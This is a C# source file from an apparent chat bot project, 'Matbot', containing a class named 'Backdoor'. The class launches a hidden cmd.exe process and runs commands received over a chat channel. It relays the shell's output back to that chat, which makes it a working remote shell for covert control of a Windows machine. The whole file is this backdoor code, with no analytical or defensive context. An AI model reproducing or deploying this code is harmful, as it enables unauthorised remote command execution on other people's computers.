using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Matbot
{
    class Backdoor
    {
        private Process shell;
        private StreamReader fromShell;
        private StreamWriter toShell;
        private Thread shellThread;


        public Client.Client client;
        public Client.ChatItemId chatId;

        public bool Running = false;

        void getShellInput()
        {
            try
            {
                String tempBuf = "\n";
                while ((tempBuf = fromShell.ReadLine()) != null && client!=null)
                {
                    client.SendMessage(chatId, tempBuf + "\n");
                    Thread.Sleep(50);
                }

            }
            catch (Exception) { /*dropConnection();*/ }
        }


        public void Start(Client.ChatItemId chatId, Client.Client client = null)
        {
            this.client = client;
            this.chatId = chatId;

            shell = new Process();
            ProcessStartInfo p = new ProcessStartInfo("cmd");
            p.CreateNoWindow = true;
            p.UseShellExecute = false;
            p.RedirectStandardError = true;
            p.RedirectStandardInput = true;
            p.RedirectStandardOutput = true;
            shell.StartInfo = p;
            shell.Start();
            toShell = shell.StandardInput;
            fromShell = shell.StandardOutput;
            toShell.AutoFlush = true;
            shellThread = new Thread(new ThreadStart(getShellInput));   //Start a thread to read output from the shell
            shellThread.Start();

            Running = true;
        }

        public void Input(String com)
        {
            try
            {                                       //to the shell, so we could write our own if we want
                if (com.Equals("exit"))
                {                //In this case I catch the 'exit' command and use it
                    client.SendMessage(chatId, "\nClosing the shell...");
                    Stop();                   //to drop the connection
                }
                toShell.WriteLine(com + "\r\n");
            }
            catch (Exception) { Stop(); }
        }

        public void Stop()
        {
            try
            {
                shell.Close();
                shell.Dispose();
                shellThread.Abort();
                shellThread = null;
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();
                Running = false;
                return;
            }
            catch (Exception) { }
        }
    }
}
